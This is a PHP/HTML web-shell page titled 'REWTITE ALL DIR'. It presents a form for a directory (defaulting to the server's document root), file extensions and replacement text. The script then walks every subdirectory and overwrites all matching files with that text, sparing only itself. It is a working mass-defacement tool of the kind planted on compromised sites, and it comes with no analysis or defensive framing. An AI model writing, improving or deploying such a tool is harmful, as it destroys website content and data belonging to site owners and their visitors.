<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
	body {
		font-family: 'Pangolin', cursive;
		background: rgba(0, 0, 0, 0.3);
	}
	table {
		border: 1px solid #c7c7c7;
		background: #fff;
		padding:20px;
		border-radius:7px;
		width:35%;
	}
	th {
		padding:10px;
		font-size:25px;
	}
	td {
		padding:2px;
	}
	textarea {
		border-radius:5px;
		min-height:250px;
		width:100%;
		resize: none;
		border: 1px solid #c7c7c7;
		outline: none;
		font-family: 'Pangolin', cursive;
	}
	input {
		outline: none;
		border: 1px solid #c7c7c7;
		border-radius:5px;
		width:100%;
		padding:7px;
		font-family: 'Pangolin', cursive;
	}
	div.alert {
		padding:7px;
		color: #fff;
		background: #52de7a;
		border-radius:5px;
	}
</style>
<table align="center">
	<tr>
		<thead>
			<th>
				REWTITE ALL DIR
			</th>
		</thead>
	</tr>
	<form method="post">
		<tr>
			<td>
				<input type="text" name="dir" value="<?= $_SERVER['DOCUMENT_ROOT'] ?>">
			</td>
		</tr>
		<tr>
			<td>
				<input type="text" name="ext[]" placeholder="ext: php html txt">
			</td>
		</tr>
		<tr>
			<td>
				<textarea name="text"></textarea>
			</td>
		</tr>
		<tr>
			<td>
				<input type="submit" name="submit" value="MASS">
			</td>
		</tr>
	</form>
<?php
if (isset($_POST['submit'])) {
	for ($i=0; $i < count($_POST['ext']) ; $i++) { 
		$plod = explode(" ", $_POST['ext'][$i]);
		foreach ($plod as $data) {
			if ($data) { ?>
				<tr>
					<td>
						<b><?= $data ?></b>
					</td>
				</tr>
				<?php mass($_POST['dir'], $data, $_POST['text']);
			}
		}
	}
}
function listFile($dir, &$output = array()) {
	foreach (scandir($dir) as $key => $value) {
		$location = $dir.DIRECTORY_SEPARATOR.$value;
		if (!is_dir($location)) {
			$output[] = $location;
		} elseif ($value != "." && $value != '..') {
			listFile($location, $output);
			$output[] = $location;
		}
	} return $output;
}

function mass($dir, $extension, $text) {
	if (is_writable($dir)) {
		foreach (listFile($dir) as $key => $value) {
			$ext = strtolower(pathinfo($value, PATHINFO_EXTENSION));
			switch ($ext) {
				case $extension:
					if (preg_match('/'.basename($value)."$/i", $_SERVER['PHP_SELF'], $matches) == 0) {
						if (file_put_contents($value, $text)) {
							?>
							<tr>
								<td>
									<div class="alert">
										<?= $value ?> <span style="float:right;">Success</span>
									</div>
								</td>
							</tr>
						<?php
						}
					}
				break;
			}
		}
	}
} 
?>
</table>
